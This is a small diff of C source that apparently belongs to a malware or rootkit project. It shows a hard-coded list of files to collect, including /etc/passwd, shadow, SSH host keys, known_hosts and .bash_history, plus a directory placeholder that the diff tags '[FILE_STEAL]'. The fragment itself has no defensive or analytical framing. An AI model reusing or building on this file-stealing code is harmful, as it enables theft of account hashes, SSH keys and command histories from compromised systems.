@@ -24,7 +24,7 @@ static char *interesting_files[15] = {"passwd", "shadow", "sshd_config", "ssh_co
                                       "ssh_host_rsa_key.pub", "apache.log", "known_hosts", ".bash_history"};
 #define INTERESTING_FILES_SIZE sizeofarray(interesting_files)
 
-#define INTEREST_DIR "??INTEREST_DIR??"
+#define INTEREST_DIR "??INTEREST_DIR??" // [FILE_STEAL]
 #define FILENAME_MAXLEN 128
 
 int interesting(const char *path);
